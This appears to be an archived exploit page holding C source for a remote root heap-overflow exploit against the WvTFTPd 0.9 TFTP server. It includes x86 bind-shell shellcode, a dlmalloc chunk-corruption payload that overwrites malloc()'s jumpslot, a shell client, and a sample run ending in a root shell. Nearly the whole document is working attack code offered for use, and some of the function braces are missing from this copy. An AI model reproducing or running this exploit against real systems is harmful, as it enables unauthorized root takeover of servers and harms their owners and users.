<html><head><title>WvTFTPd 0.9 Remote Root Heap Overflow Exploit</title></head><pre>/*
* wvtftp option name heap overflow remote root exploit
*
* infamous42md AT hotpop DOT com
*
* exploitation is not exactly straight forward. When we overflow our buffer,
* we overwrite a pointer that is freed before we get to trigger our overwrite.
* so we have to restore the state of this pointer to some sane value so it can
* be freed. after we do this, we trigger the overwrite, and hijack the
* jumpslot for malloc(). then to trigger malloc(), we send a bogus request,
* and then connect to our shell. all of the offsets should be fixed for 32 bit
* platforms, all you need to pass is the base address of the heap buffer we're
* overflowing. 'ltrace wvtftpd -dd 2&gt;&amp;1 | grep malloc | grep 616', and of
* course the jumpslot for malloc(), 'objdump -R wvtftpd | grep malloc'.
*
*/

#if 0
Usage: ./a.out
[ -h host ] [ -r object_heap_base ] [ -l retloc ]
[ -f remote file ] &lt; -p port &gt; &lt; -a align &gt;
[n00b@localho.outernet] ./a.out -h localho -r 0x8063cd0 -l 0x0805e540

connected to localho(127.0.0.1)

exploit sent, total data len 597

triggering overwritten jumpslot


connected to localho(127.0.0.1)

got a shell

id
uid=0(root) gid=0(root)
groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy)

- Connection closed by user
#endif

#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netdb.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;stdlib.h&gt;

#define REMOTE_FILE &quot;foo&quot;
#define FTP_PORT 69
#define NOP 0x90
#define BS 0x1000
#define SHELL_PORT 7000
#define ALIGN 0
#define die(x) do{ perror(x); exit(1); }while(0)

/* a dlmalloc chunk descriptor */
#define CHUNKSZ sizeof(mchunk_t)
typedef struct _mchunk {
size_t prevsz;
size_t sz;
long fd;
long bk;
} mchunk_t;

/* program arguments */
typedef struct _args {
char *host,
*remote_file;
u_long object_heap_base,
retloc;
u_short port,
align;
} args;


/* call them shell code */
#define SHELL_LEN (sizeof(remote)-1)
char remote[] =
&quot;\xeb\x0a&quot;&quot;1234567890&quot; /* jump */
&quot;\x31\xc0\x50\x50\x66\xc7\x44\x24\x02\x1b\x58\xc6\x04\x24\x02\x89\xe6&quot;
&quot;\xb0\x02\xcd\x80\x85\xc0\x74\x08\x31\xc0\x31\xdb\xb0\x01\xcd\x80\x50&quot;
&quot;\x6a\x01\x6a\x02\x89\xe1\x31\xdb\xb0\x66\xb3\x01\xcd\x80\x89\xc5\x6a&quot;
&quot;\x10\x56\x50\x89\xe1\xb0\x66\xb3\x02\xcd\x80\x6a\x01\x55\x89\xe1\x31&quot;
&quot;\xc0\x31\xdb\xb0\x66\xb3\x04\xcd\x80\x31\xc0\x50\x50\x55\x89\xe1\xb0&quot;
&quot;\x66\xb3\x05\xcd\x80\x89\xc5\x31\xc0\x89\xeb\x31\xc9\xb0\x3f\xcd\x80&quot;
&quot;\x41\x80\xf9\x03\x7c\xf6\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62&quot;
&quot;\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80\xa1\x5f\x66\x6e\x69&quot;;


void usage(char *progname)

fprintf(stderr, &quot;Usage: %s\n&quot;
&quot;\t[ -h host ] [ -r object_heap_base ] [ -l retloc ]\n&quot;
&quot;\t[ -f remote file ] &lt; -p port &gt; &lt; -a align &gt;\n&quot;,
progname);
exit(EXIT_FAILURE);



void parse_args(int argc, char **argv, args *argp)

int c = 0;

while((c = getopt(argc, argv, &quot;h:p:r:a:l:&quot;)) != -1) {
switch (c) {
case 'a':
argp-&gt;align = atoi(optarg);
break;
case 'p':
argp-&gt;port = atoi(optarg);
break;
case 'r':
argp-&gt;object_heap_base = strtoul(optarg, NULL, 16);
break;
case 'l':
argp-&gt;retloc = strtoul(optarg, NULL, 16);
break;
case 'h':
argp-&gt;host = optarg;
break;
case 'f':
argp-&gt;remote_file = optarg;
break;
case ':':
case '?':
default:
usage(argv[0]);
}
}

if(optind != argc || argp-&gt;align &gt; CHUNKSZ-1 || argp-&gt;object_heap_base == 0
|| 
argp-&gt;host == NULL || argp-&gt;port == 0 || argp-&gt;retloc == 0 || 
argp-&gt;remote_file == NULL)
usage(argv[0]);


int conn(char *host, u_short port, int proto)

int sock = 0;
struct hostent *hp;
struct sockaddr_in sa;

memset(&amp;sa, 0, sizeof(sa));

hp = gethostbyname(host);
if (hp == NULL) {
herror(&quot;gethostbyname&quot;);
exit(EXIT_FAILURE);
}
sa.sin_family = AF_INET;
sa.sin_port = htons(port);
sa.sin_addr = **((struct in_addr **) hp-&gt;h_addr_list);

sock = socket(AF_INET, proto, 0);
if (sock &lt; 0)
die(&quot;socket&quot;);

/* with UDP this means we can write() instead of sendto() */
if (connect(sock, (struct sockaddr *) &amp;sa, sizeof(sa)) &lt; 0)
die(&quot;connect&quot;);

printf(&quot;\nconnected to %s(%s)\n\n&quot;, host, inet_ntoa(sa.sin_addr));
return sock;


/*
* ftp packet bytes look like:
*
* 0-1 code - [0]*256 + [1] : 1 for read, 2 for write
* 2 NULL termed file name, must exist and be readable
* X NULL termed mode [ netascii octet mail ]
* Y NULL termed option name
* Z NULL termed option value : overflow with this string
* and a bad option to get our pointer freed
*/
void sploit(args *argp, int sock)

int len = 0, align = argp-&gt;align, x = 0, begin_packet_data;
long retloc = argp-&gt;retloc, object_heap_base = argp-&gt;object_heap_base;
char buf[BS], *remote_file = argp-&gt;remote_file;
mchunk_t chunk;

memset(buf, 0, BS);
memset(&amp;chunk, 0, CHUNKSZ);

/* set opcode for reading */
buf[1] = 1;
len = 2;

/* the file to read, and the mode */
len += sprintf(buf + len, &quot;%s&quot;, remote_file) + 1;
len += sprintf(buf + len, &quot;%s&quot;, &quot;octet&quot;) + 1;

/* all that follows gets copied via strcpy() */
begin_packet_data = len;

/* the option */
len += sprintf(buf+len, &quot;%s&quot;, &quot;blksize&quot;) + 1; /* 8 */

/* the overflow , but first a valid blocksize to past test */
len += sprintf(buf+len, &quot;%s&quot;, &quot;512&quot;); /* 3 */

/* 
* from here buffer looks like:
* [ align - shell - chunks - pkttimes - chunks ]
*/
#define OFFSET_TO_OUR_BUF_FROM_BASE 56
/* setup the chunk */
chunk.prevsz = 0xfffffffc;
chunk.sz = 0xfffffffc;
chunk.fd = retloc - 12;
chunk.bk = object_heap_base + OFFSET_TO_OUR_BUF_FROM_BASE + align + 11/* 8 +
3 */;

memset(buf+len, 'A', align);
len += align;
memcpy(buf+len, remote, SHELL_LEN);
len += SHELL_LEN;

#define CHUNK_BYTES 416
for(x = 0; x &lt; CHUNK_BYTES - (CHUNKSZ - 1); x+= CHUNKSZ)
memcpy(buf+len+x, &amp;chunk, CHUNKSZ);
len += x;
buf[len++] = 0;

/* trigger the free with a bad option (no value) */
len += sprintf(buf+len, &quot;%s&quot;, &quot;blksize&quot;) + 1;

/*
* the buffer we overflow is part of a larger structure that is embedded in
* a class object located on the heap. the base address of this object is
* what 'object_heap_base' refers to. the structure is 'struct TFTPConn',
* member of the 'class WvTFTPBase'. we need to repair a pointer in the
* data that we overwrite. the pkttimes member of the structure is a
* pointer to an object of type 'class PktTime' that gets deleted. in this
* destructor for the object that gets deleted, a member pointer offset 12
* bytes in, is a pointer that gets freed via delete. This freed pointer
* needs to be set up by us. You could create a fake chunk and use that,
* but it is simpler to just make that pointer be NULL as free(0) does
* nothing. there are several spots where we have a guaranteed NULL word
* inside of the 'struct TFTPConn' class object. so the idea is to point
* pkttimes 12 bytes below that NULL, so that when it goes to free the
* pointer, it will use the NULL word.
*/

/* 
* our buffer is 512 bytes, and we start copying at 2 bytes in. the
* distance to pkttimes pointer is 526 bytes, rounded up to 4 byte boundary
*/
#define OFFSET_TO_PKTTIMES_IN_BUFFER 528
/*
* we point pkttimes at an area that contains guaranteed NULL word, which is
* the 'lastsent' member of the TFTPConn structure. it is the number of
* blocks which have been sent over teh connection so far. it will always
* be 0 since no blocks have been sent to us yet. if we know the base of
* the object we know where 'lastsent' is located.
*/
#define OFFSET_TO_NULL_POINTERS_FROM_BASE_MINUS_12 40
*(uint32_t *)(buf + begin_packet_data + OFFSET_TO_PKTTIMES_IN_BUFFER) = 
object_heap_base + OFFSET_TO_NULL_POINTERS_FROM_BASE_MINUS_12;

write(sock, buf, len);
printf(&quot;exploit sent, total data len %d\n\n&quot;, len);


void shell(char *host, u_short port)

int sock = 0, l = 0;
char buf[BS];
fd_set rfds;

sock = conn(host, port, SOCK_STREAM);

printf(&quot;got a shell\n\n&quot;);
FD_ZERO(&amp;rfds);

while(1){
FD_SET(STDIN_FILENO, &amp;rfds);
FD_SET(sock, &amp;rfds);

if(select(sock + 1, &amp;rfds, NULL, NULL, NULL) &lt; 1)
die(&quot;select&quot;);

if(FD_ISSET(STDIN_FILENO, &amp;rfds)) {
if((l = read(0, buf, BS)) &lt;= 0)
die(&quot;\n - Connection closed by user\n&quot;);
if(write(sock, buf, l) &lt; 1)
die(&quot;write&quot;);
}

if(FD_ISSET(sock, &amp;rfds)) {
l = read(sock, buf, sizeof(buf));

if (l == 0)
die(&quot;\n - Connection terminated.\n&quot;);
else if(l &lt; 0)
die(&quot;\n - Read failure\n&quot;);

if(write(1, buf, l) &lt; 1)
die(&quot;write&quot;);
}
}


/*
* call the function whose jumpslot we overwrote, malloc()
*/
void trigger_retloc(int sock)

char buf[BS];

write(sock, buf, 200);


/*
*/
int main(int argc, char **argv)

int sock = 0;
args argy;

memset(&amp;argy, 0, sizeof(argy));
argy.align = ALIGN;
argy.port = FTP_PORT;
argy.remote_file = REMOTE_FILE;

parse_args(argc, argv, &amp;argy);

sock = conn(argy.host, argy.port, SOCK_DGRAM);

sploit(&amp;argy, sock);

sleep(2);
printf(&quot;triggering overwritten jumpslot\n\n&quot;);
trigger_retloc(sock);
sleep(1);
close(sock);

shell(argy.host, SHELL_PORT);

return EXIT_SUCCESS;

// milw0rm.com [2004-10-28]</pre></html>